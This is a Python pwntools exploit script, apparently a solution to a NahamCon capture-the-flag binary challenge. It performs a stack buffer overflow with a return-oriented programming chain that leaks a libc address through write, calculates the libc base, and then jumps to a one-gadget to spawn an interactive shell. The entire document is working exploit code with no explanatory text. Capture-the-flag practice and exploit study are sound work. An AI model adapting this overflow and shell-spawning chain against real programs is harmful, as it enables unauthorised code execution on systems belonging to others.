#!/usr/bin/python3

from pwn import *

exe = ELF('all_patched_up_patched', checksec=False)
libc = ELF('libc-2.31.so', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*main+62

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('challenge.nahamcon.com', 32244)
else:
        p = process(exe.path)

GDB()
pop_rsi_r15_mov_rdi = 0x0000000000401251
rw_section = 0x0000000000404a00
payload = b""
payload = payload.ljust(512+8, b"\0") + flat(
        pop_rsi_r15_mov_rdi, 0x404018, 0,
        exe.sym['write'],
        exe.sym['main']
)
sa(b"> ", payload)
leak = u64(p.recv(6) + b"\0\0")
info("libc leak: " + hex(leak))
libc.address = leak - libc.sym['write']
info("libc base: " + hex(libc.address))
pop_r12_r13_r14_r15 = 0x000000000040124c
pop_rdi = 0x0000000000023b6a
payload = b"a" * 520 + flat(
        # libc.address + pop_rdi, 
        pop_r12_r13_r14_r15, 0, 0 ,0 ,0,
        libc.address + 0xe3afe
)
sla(b"> ", payload)
p.interactive()
